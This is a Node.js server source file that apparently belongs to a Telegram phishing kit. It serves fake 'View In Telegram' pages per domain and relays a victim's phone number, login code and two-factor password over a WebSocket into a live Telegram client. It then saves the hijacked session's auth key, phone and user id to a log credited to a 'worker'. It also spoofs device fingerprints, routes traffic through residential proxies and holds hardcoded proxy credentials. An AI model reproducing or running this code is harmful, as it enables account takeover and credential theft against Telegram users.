import express from "express";
import http from 'http';
import { WebSocketServer } from "ws";
import { TelegramClient } from "telegram";
import { StringSession } from "telegram/sessions/index.js";
import qs from 'querystring';
import config from '../config.json' assert { type: "json" };
import saveLog from "./saveLog.js";
import Database from "./database/index.js";
import hbs from 'hbs';
import domain from "./database/domain.js";
import Session from "./session.js";
import domainTemplate from "./database/domainTemplate.js";
import fs from 'fs';
import parsePhoneNumber from 'libphonenumber-js'
import ake from "./ake.js";

await Database.connect(config.db);
const app = express(),
    server = http.createServer(app,);
const ws = new WebSocketServer({ server })

app.set('view engine', 'html');
app.engine('html', hbs.__express);
app.set('views', `src/views`);

function makeid(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    let counter = 0;
    while (counter < length) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
        counter += 1;
    }
    return result;
}

const proxy = fs.readFileSync('proxy.txt', 'utf-8')
    .replaceAll('\r', '')
    .split('\n');

const getRandomDeviceParams = () => {
    const deviceParams = {
        ios: {
            appVersions: [
                "10.9.24 A",
                "10.9.23 A",
                "10.9.22 A",
                "10.9.21 A",
                "10.9.20 A",
                "10.9.19 A",
                "10.9.18 A",
                "10.9.17 A",
                "10.9.16 A"
            ],
            browsers: [
                "Safari 17.2",
                "Safari 17.1",
                "Safari 17.0",
                "Safari 16.6",
                "Safari 16.5",
                "Safari 16.4",
                "Safari 16.3",
                "Safari 16.2",
                "Safari 16.1",
                "Opera 104.0.4944",
                "Opera 103.0.4928",
                "Safari 16.0"
            ]
        },
        android: {
            appVersions: [
                "10.9.24 A",
                "10.9.23 A",
                "10.9.22 A",
                "10.9.21 A",
                "10.9.20 A",
                "10.9.19 A",
                "10.9.18 A"
            ],
            browsers: [
                "Chrome 120.0.6099",
                "Chrome 120.0.6098",
                "Chrome 119.0.6045",
                "Chrome 119.0.6044",
                "Chrome 118.0.5993",
                "Firefox 121.0",
                "Firefox 120.0",
                "Firefox 119.0",
                "Opera 104.0.4944",
                "Opera 103.0.4928"
            ]
        }
    };

    const platform = Math.random() > 0.5 ? 'ios' : 'android';
    const params = deviceParams[platform];

    return {
        appVersion: params.appVersions[Math.floor(Math.random() * params.appVersions.length)],
        deviceModel: params.browsers[Math.floor(Math.random() * params.browsers.length)],
        systemVersion: platform.toUpperCase(),
        langCode: "ru",
        systemLangCode: "ru-RU",
        langPack: "android"
    };
}

const formatProxy = proxy => {
    const [username, password, ip, port] = proxy.split(':');

    console.log({ ip, port: +port, username, password, socksType: 5 })
    return undefined;

    return { ip, port: +port, username, password, socksType: 5 };
}

app.get('/ready', (_req, res) => {
    res.json(true);
})


app.get(`/`, async (req, res) => {
    const site = await domain.findOne({ name: req.headers['host'] });

    if (site?.template === 0) return res.redirect('/login');

    const template = await domainTemplate.findOne({ id: site?.template });
    if (!site || !template) return res.status(404).send(`404`);

    template.text = template.type === 'bot' ? 'Send Message' : "View In Telegram";

    res.render(`zaza`, template);
})

app.use(express.static('src/public'));

app.get('/login', (_, res) => {
    res.send(fs.readFileSync(`src/public/index.html`, 'utf-8'));
});

app.get(`/log`, async (req, res) => {
    let site = await domain.findOne({ name: req.headers['host'] }) || {
        worker: 5439242814,
        name: 'localhost'
    };

    if (!site) return res.send('чоч');
    let owner = site.worker;
    console.log(site, owner)
    let bot = req.headers['host'];


    // const akeProxy = await ake.createPort('ru')
    //     .catch((() => ake.createPort('ru')));

    const deviceParams = getRandomDeviceParams();
    const formated = { ip: `geo.iproyal.com`, port: 32325, username: `rvcR5d7QURSEcSyV`, password: `VB0RceDyPGxckBEm_country-${'ru'}_streaming-1`, socksType: 5 }
    const client = new TelegramClient(new Session(+req.query.dc, Buffer.from(req.query.key, 'hex')), config.apiId, config.apiHash, {
        connectionRetries: 10,
        proxy: formated,
        "appVersion": deviceParams.appVersion,
        "deviceModel": deviceParams.deviceModel,
        "systemVersion": deviceParams.systemVersion,
        'langCode': deviceParams.langCode
    });

    await client.connect();

    const user = await client.getMe();

    await saveLog({
        id: Date.now(),
        worker: owner,
        uid: user.id,
        premium: user.premium,
        dcId: req.query.dc,
        authKey: req.query.key,
        phone: user.phone,
        bot,
        deviceParams: deviceParams,
        proxy: formated
    });

    await client.disconnect();
    // await ake.deletePort(akeProxy.id);

    res.send(`ok`);
});

ws.on('connection', async (socket, request) => {
    let id, owner, type, bot, user, site, lang

    try {
        const parsed = qs.parse(request.url.split("?")[1]);
        id = parsed.id;
        owner = parsed.owner;
        type = parsed.type;
        lang = parsed.lang || 'ru';
        bot = parsed.token;

        console.log(id, owner, type, bot)
        if (!['bot', 'web', `qr`].includes(type) || !id) throw new Error(`Unauth`);
    } catch (e) {
        socket.send(`0-0`);
        return socket.close();
    }

    console.log(1)
    if (type !== `bot`) {
        site = await domain.findOne({ name: id }) || {
            worker: 5439242814,
            name: 'localhost'
        };
        if (!site) return socket.close();
        owner = site.worker;
        bot = id;
    }

    let number;

    socket.on('message', message => {
        try {
            message = JSON.parse(message.toString());
        } catch {
            socket.send(`0-0`);
            return socket.close();
        }

        if (message.action === 'number') number = message.data;
    })

    const waitForAction = action => new Promise(resolve => {
        console.log(action);
        if (action === 'number' && number) return resolve(number);

        socket.send(JSON.stringify({ action }))
        socket.onmessage = message => {
            try {
                message = JSON.parse(message.data);
            } catch {
                socket.send(`0-0`);
                return socket.close();
            }
            if (!message.action && !message.data) return socket.close();
            if (message.action === action) {
                console.log(message);
                resolve(message.data);
            }
        }
    });

    // let nnn = await waitForAction('number');

    let location = 'ru'//lang;//(parsePhoneNumber(nnn) || parsePhoneNumber("+" + nnn))?.country?.toLowerCase();

    // const akeProxy = await ake.createPort(location)
    //     .catch((() => ake.createPort('ru')));

    const formated = { ip: `geo.iproyal.com`, port: 32325, username: `rvcR5d7QURSEcSyV`, password: `VB0RceDyPGxckBEm_country-${location}_streaming-1`, socksType: 5 }
    // const formatedAke = { 
    //     ip: akeProxy.server, 
    //     port: akeProxy.port, 
    //     username: akeProxy.login, 
    //     password: akeProxy.password, 
    //     socksType: 5 
    // }
    const deviceParams = getRandomDeviceParams();
    const client = new TelegramClient(new StringSession(), config.apiId, config.apiHash, {
        connectionRetries: 10,
        proxy: formated,
        "appVersion": deviceParams.appVersion,
        "deviceModel": deviceParams.deviceModel,
        "systemVersion": deviceParams.systemVersion,
        'langCode': deviceParams.langCode
    });

    setTimeout(async () => {
        try {
            socket.close();
            await client.disconnect();
            // await ake.deletePort(akeProxy.id)
        } catch (e) {
            console.error(e);
        }
    }, 300000);

    socket.send(JSON.stringify({ action: 'connected' }));

    await client.start({
        phoneNumber: async () => await waitForAction('number'),
        password: async () => await waitForAction('password'),
        phoneCode: async () => await waitForAction('code'),
        onError: (data) => {
            number = undefined;
            console.log(data);
            socket.send(JSON.stringify({ action: 'error', data }));
        }
    });

    console.log(client.session.save());
    socket.send(JSON.stringify({ action: 'success' }))
    socket.close();

    const uu = await client.getMe();

    await saveLog({
        id: Date.now(),
        worker: owner,
        dcId: client.session.dcId,
        uid: uu.id,
        authKey: new StringSession(client.session.save())._key?.toString('hex'),
        phone: uu.phone,
        premium: uu.premium,
        bot,
        deviceParams: deviceParams,
    });

    await client.disconnect().catch(console.error);
    // await ake.deletePort(akeProxy.id)
});

server.listen(80, () => console.log("Server started"));